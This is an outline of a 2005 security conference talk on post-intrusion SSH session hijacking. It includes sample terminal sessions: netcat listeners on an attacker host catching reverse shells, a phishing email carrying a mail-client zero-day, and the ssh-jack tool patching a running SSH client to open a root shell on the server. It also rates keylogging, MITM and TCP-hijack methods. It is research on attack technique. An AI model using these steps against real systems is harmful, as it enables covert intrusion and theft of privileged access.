### Trust Transience: Post-Intrusion SSH Hijacking

**Presented at Blackhat USA 2005 & Defcon 13**

#### Introduction
- **Presenter**: Metlstorm / Adam
- **From**: New Zealand
- **Background**: Linux systems integrator, former corporate security consultant, ISP security expert, and NOC technician.
- **Note**: No, I don't know any hobbits. (For the Tolkien fans out there)

#### The Target
- **Reconnaissance**:
  - **Mail Headers**: Indicate that the Mail User Agent (MUA) is PINE.
  - **Signature**: Mentions Debian Sarge with kernel version 2.4.22.
  - **Web Logs**: Suggest egress HTTPS traffic does not go through a proxy (source address is their NAT router).

#### The Plan
- **Execution**:
  ```bash
  haxor:~$ nc -l -p 1337
  admin@box:~$ id
  uid=1004(admin) gid=1004(admin) groups=1004(admin)
  admin@box:~$ ps auxw | grep -q pine || echo shit
  shit
  admin@box:~$ ls core
  core
  admin@box:~$ uname -nsr
  Linux box 2.6.11
  haxor:~$ ./pine0day | spoofmail -f 'Mr. Mbeki' -s 'Opportunity for joo!' PI:EMAIL
  ```

- **Observations**:
  ```bash
  admin@box:~$ w
  USER  TTY   FROM      LOGIN@ IDLE JCPU PCPU WHAT
  admin pts/1 :0        09:28 10.3m 3.1s 0.2s bash
  admin pts/2 :0        09:31  1.0s 1.4s 0.9s bash
  admin pts/3 haxor.com 14:03  0.0s 0.3s 0.3s w
  admin@box:~$ ps x
  3132 ?        S    0:23 xfwm4 --daemon --sm-client-id 34235
  3590 ?        S+   0:05 xterm -rv
  3593 pts/1    Ss+  0:02 bash
  3597 pts/1    S+   0:12 ssh PI:EMAIL
  9034 ?        S+   0:03 xterm -rv
  9036 pts/2    Ss+  0:02 bash
  9154 pts/3    R+   0:00 ps x
  ```

- **Situation Analysis**:
  - Things have gone wrong.
  - No root access yet, and about to get caught.
  - Option to drop the connection and run, but the SSH session is close.
  - Is there a way to hijack the SSH session?

#### There is a Way
- **SSH Hijacking**:
  ```bash
  admin@box:~$ :!!!!mafl-load ssh-jack 3597 haxor.com 1338
  Connecting to /usr/bin/ssh running as pid 3597...
  Connected
  Ferreting out some useful symbols...
  Located libc symbol 'socket' at 0xb7e19a50
  Located libc symbol 'connect' at 0xb7e195c0
  Located libc symbol 'select' at 0xb7e12490
  Located section '.got' 0x0807eb8c to 0x0807eef4
  Located section '.plt' 0x0804aa68 to 0x0804b7d8
  Located section '.text' 0x0804b7e0 to 0x08070450
  Located section '.rodata' 0x08070480 to 0x0807dd6c
  Resolved dynamic symbol 'socket' at PLT: 0x0804b6b8 GOT: 0x0807eea8
  Resolved dynamic symbol 'select' at PLT: 0x0804ad88 GOT: 0x0807ec5c
  Resolved dynamic symbol 'connect' at PLT: 0x0804b5f8 GOT: 0x0807ee78
  Locating stub injection point...
  Phase 1: Find magic string in .rodata... 0x0807139c
  Phase 2: Find where magic string is used... 0x0804d803
  Phase 3: Find three jump 0x0804d800 instructions... 0x0804d6d9 0x0804d6e1 0x0804d6e9
  haxor:~$ nc -l -p 1338
  root@ns1:~# echo pwned!
  pwned!
  ```

#### Intrusion and Adaptability
- **Intrusion**:
  - **Method of Operation (MO)**: Attack servers via the administrators.
  - **Complexity**: Insecurity increases with complexity.
  - **Adaptability**: When things go wrong, adaptability is key.

- **Post-Intrusion Goals**:
  - **Privilege Escalation**
  - **Stealth and Consolidation**
  - **Further Recon and Penetration**
  - **Guerrilla Tactics**: Hit and fade, keep moving.

- **Displaying Adaptability**:
  - Adapting when things don't go according to plan.
  - Core difference between hackers and script kiddies.

#### Cross-Host Privilege Escalation
- **Local Root vs. Easier Exploits**:
  - Local vulnerabilities are easier to exploit due to visibility of stack layout and versions.
  - But what if there were an even easier method?

- **Trust Relationships**:
  - **Old-School Methods**:
    - `rhosts`
    - Ports < 1024 == root
    - Exporting `/` (rw)
  - **Nostalgia**: Instant gratification without user interaction.

- **Non-Transient Trusts**:
  - Traditional fixed trusts (e.g., `rhosts`, SSH trusts).
  - Stored authentication credentials.
  - One-factor authentication.
  - Authentication based on connection properties (e.g., source IP, port).

- **Transient Trust**:
  - Trust relationships that exist only for a period.
  - Open, post-authentication sessions.
  - Any cross-privilege boundary connection has some transient trust unless each packet is personally authenticated.

#### Exploit Metrics
- **Evaluation**:
  - Assume we've acquired a non-root shell on a client machine.
  - Metrics (value 1-10):
    - Ease
    - Stealth
    - When
    - Feasibility

- **Exploiting Non-Transient Trust**:
  - Pretend to be Client A so the server trusts us.
  - **Metrics**:
    - Ease: 10
    - Stealth: 10
    - When: 10
    - Feasibility: 2

- **Exploiting (Keylogging)**:
  - During Authentication: Obtain User A's password.
  - Later: Impersonate User A.
  - **Metrics**:
    - Ease: 7
    - Stealth: 8
    - When: 3
    - Feasibility: 7

- **Exploiting (MITM)**:
  - During Authentication: Impersonate Server to Client and Client to Server.
  - Later: Monitor and take over the session.
  - **Metrics**:
    - Ease: 5
    - Stealth: 4
    - When: 3
    - Feasibility: 5

- **Exploiting (TCP Hijack)**:
  - Later: Predict TCP sequence numbers and take over the running session.
  - **Metrics**:
    - Ease: 3
    - Stealth: 1
    - When: 7
    - Feasibility: 2

- **Exploiting (Application Hijack)**:
  - Later: Take control of the network client application and sneak down the running, authenticated session.
  - **Metrics**:
    - Ease: 8
    - Stealth: 8
    - When: 7
    - Feasibility: 7

#### Hijack the Application
- **Different Method of Operation**:
  - Attack during peak times while users are present.
  - Daylight robbery: Take their root while they're using it, without them noticing.
  - Not technically challenging, just creative reapplication of tricks from viruses, debugging, and binary reverse-engineering.

- **Technique Comparison**:
  - **Conclusion**: Transient trusts are almost as fun as the real thing.
  - **Graph**:
    - Shows the feasibility, stealth, timing, and ease of different techniques.

#### The SSH 'Jacker
- **SSH-Jack**: A Python script to give you a shell at the other end of a running SSH session.
  - **How it Works**:
    - Reuse SSH features for malicious purposes.
    - Glue a socket to a second shell, add an Evil Hax0r, and mix well.
  - **Implementation Details**:
    - Using Python and GDB/MI:
      - Ptrace attaches to the SSH client process.
      - Finds and patches the virtual channel setup code in memory.
      - Alters execution flow to run the VC setup code.

- **Anti-Forensics and Mitigation**:
  - Techniques to avoid detection and methods to mitigate such attacks.

- **Improvements and Future Directions**:
  - Enhancements and future developments for the SSH-Jack tool.

#### Rich Protocols: SSH
- **Goal**: Hijack a session while in active use without detection.
- **Virtual Channel Infrastructure**: Makes the hijacking seamless.

- **How it Works**:
  - **Phase I**: Reuse SSH features for malicious purposes.
  - **Phase II**: Use Python and GDB/MI to ptrace attach to the SSH client process.
  - **Phase III**: Find and patch the virtual channel setup code in memory.
  - **Phase IV**: Alter execution flow to run the VC setup code.

By following these steps, the SSH session can be hijacked, providing a backdoor for further exploitation.